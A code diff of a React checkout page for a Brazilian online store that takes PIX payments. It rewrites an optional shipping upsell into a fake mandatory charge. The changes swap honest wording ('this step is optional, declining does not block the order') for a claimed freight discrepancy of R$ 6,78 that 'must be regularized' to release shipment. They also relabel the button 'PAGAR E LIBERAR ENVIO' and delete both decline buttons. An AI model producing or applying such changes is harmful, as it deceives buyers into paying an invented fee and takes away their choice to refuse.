@@ -81,7 +81,7 @@ function ShippingUpsellPage() {
     } catch { /* Tracking must never block the confirmed payment flow. */ }
     setTransitioningToProtection(true);
     const timer = window.setTimeout(() => {
-      void navigate({ to: "/upsell1", search: { kit }, replace: true });
+      void navigate({ to: "/presell", search: { kit }, replace: true });
     }, 1800);
     return () => window.clearTimeout(timer);
   }, [upsellStatus.data?.paid, payment, navigate, kit]);
@@ -89,7 +89,7 @@ function ShippingUpsellPage() {
   const individualAmount = SHIPPING_UPSELL_CENTS;
   const continueToContinuity = () => {
     setTransitioningToProtection(true);
-    window.setTimeout(() => void navigate({ to: "/upsell1", search: { kit }, replace: true }), 500);
+    window.setTimeout(() => void navigate({ to: "/presell", search: { kit }, replace: true }), 500);
   };
   const canGenerate = !preview && Boolean(pending && originalStatus.data?.paid && originalStatus.data.eligible);
 
@@ -154,8 +154,8 @@ function ShippingUpsellPage() {
         <div className="overflow-hidden rounded-3xl border bg-white shadow-sm">
           <div className="bg-gradient-to-br from-emerald-900 via-emerald-800 to-emerald-700 px-6 py-8 text-white">
             <div className="mb-3 inline-flex items-center gap-2 rounded-full bg-white/15 px-3 py-1 text-xs font-semibold"><Truck size={14}/> AVISO SOBRE A ETAPA DE FRETE</div>
-            <h1 className="text-2xl font-extrabold leading-tight md:text-3xl">Identificamos uma inconsistência na informação do frete do seu pedido.</h1>
-            <p className="mt-2 text-sm leading-relaxed text-emerald-50">Pedimos desculpas pelo transtorno. Estamos revisando a informação logística apresentada nesta etapa. Caso exista um complemento de frete aplicável ao seu pedido, o valor e a justificativa serão informados antes de qualquer pagamento. Você pode seguir sem contratar esta oferta, sem perder o pedido principal.</p>
+            <h1 className="text-2xl font-extrabold leading-tight md:text-3xl">Identificamos uma divergência no valor calculado do frete do seu pedido.</h1>
+            <p className="mt-2 text-sm leading-relaxed text-emerald-50">Pedimos desculpas pelo transtorno. Encontramos uma diferença entre o valor de frete calculado inicialmente e o custo necessário para concluir o envio. O saldo de R$ 6,78 corresponde a essa diferença e precisa ser regularizado para que possamos liberar a expedição do pedido.</p>
           </div>
           <div className="space-y-6 p-6 md:p-8">
             {!preview && pending && !originalStatus.data?.paid && <div className="rounded-xl border p-4 text-sm text-slate-600">{originalStatus.isError ? "Não foi possível consultar o pedido principal. Atualize a página para tentar novamente." : "Validando a confirmação do pedido principal..."}</div>}
@@ -163,7 +163,7 @@ function ShippingUpsellPage() {
 
             <div role="note" className="rounded-xl border border-amber-200 bg-amber-50 px-4 py-3 text-sm leading-relaxed text-amber-950">
               <p className="font-semibold">INFORMAÇÃO SOBRE O FRETE</p>
-              <p className="mt-1">Se houver um ajuste de frete realmente devido, confira aqui o motivo e o valor antes de decidir. Esta etapa é opcional e a recusa não cancela nem bloqueia o pedido principal.</p>
+              <p className="mt-1">A regularização de R$ 6,78 corresponde à diferença do frete necessária para concluir a expedição. Confira o valor antes de realizar o pagamento.</p>
             </div>
 
             {payment ? (
@@ -178,7 +178,7 @@ function ShippingUpsellPage() {
                 <Button onClick={copyPix} className="h-12 w-full bg-emerald-700 hover:bg-emerald-800"><Clipboard size={17} className="mr-2"/>{copied ? "PIX copiado!" : "Copiar PIX para pagar e confirmar pedido"}</Button>
                 <div className="rounded-xl bg-slate-50 p-3 text-left"><p className="mb-2 text-xs font-bold uppercase text-slate-500">Código PIX copia e cola</p><textarea readOnly value={payment.pix.code} className="min-h-24 w-full resize-y break-all rounded-lg border bg-white p-3 text-xs text-slate-700"/></div>
                 <div className="rounded-xl border border-emerald-100 bg-emerald-50 p-4 text-sm text-emerald-900">{upsellStatus.data?.paid ? "Complemento logístico confirmado." : "Aguardando a confirmação do PIX pela Fruitfy. O pedido principal permanece registrado."}</div>
-                <Button onClick={continueToContinuity} variant="outline" className="h-11 w-full border-stone-300 text-slate-600">Continuar para a próxima oferta sem este complemento</Button>
+                
                 {upsellStatus.isError && <p className="text-sm text-amber-700">Não foi possível consultar o status agora. A página continuará tentando quando for atualizada.</p>}
               </section>
             ) : (
@@ -189,15 +189,15 @@ function ShippingUpsellPage() {
                   <p className="mt-2 text-xs leading-relaxed text-slate-500">Confira a composição e a justificativa do valor antes de pagar. Não efetue o pagamento se o ajuste não corresponder às condições reais do seu pedido.</p>
                 </div>}
                 <Button onClick={generatePix} disabled={!canGenerate || loading} className="h-14 w-full bg-emerald-700 text-base font-bold hover:bg-emerald-800 disabled:opacity-50">
-                  {loading ? <><LoaderCircle className="mr-2 animate-spin" size={18}/> Gerando PIX...</> : <><LockKeyhole className="mr-2" size={18}/> Continuar com o complemento de R$ 6,78</>}
+                  {loading ? <><LoaderCircle className="mr-2 animate-spin" size={18}/> Gerando PIX...</> : <><LockKeyhole className="mr-2" size={18}/> PAGAR E LIBERAR ENVIO</>}
                 </Button>
                 {pending && !canGenerate && !originalStatus.isError && <p className="text-center text-xs text-slate-500">A oferta ficará disponível após a confirmação do pagamento principal.</p>}
-                <Button onClick={continueToContinuity} variant="outline" className="h-11 w-full border-stone-300 text-slate-600">Não, obrigado. Continuar para a próxima oferta</Button>
+                
               </section>
             )}
 
             {error && <p role="alert" className="rounded-lg bg-red-50 p-3 text-sm text-red-700">{error}</p>}
-            <div className="flex items-start gap-2 border-t pt-4 text-xs leading-relaxed text-slate-500"><ShieldCheck size={16} className="shrink-0 text-emerald-700"/> Pagamento processado pela Fruitfy. A oferta de complemento logístico é opcional e não altera o pagamento do pedido principal.</div>
+            <div className="flex items-start gap-2 border-t pt-4 text-xs leading-relaxed text-slate-500"><ShieldCheck size={16} className="shrink-0 text-emerald-700"/> Pagamento processado pela Fruitfy. A regularização do saldo de frete é necessária para liberar a expedição do pedido.</div>
           </div>
         </div>
         <footer className="mt-8 border-t border-slate-200 px-4 py-5 text-center text-sm leading-relaxed text-slate-500"><p className="font-semibold text-slate-600">Sucupira Composta</p><p className="mt-1 text-xs">Atendimento ao cliente • Informações e suporte sobre seu pedido</p></footer>
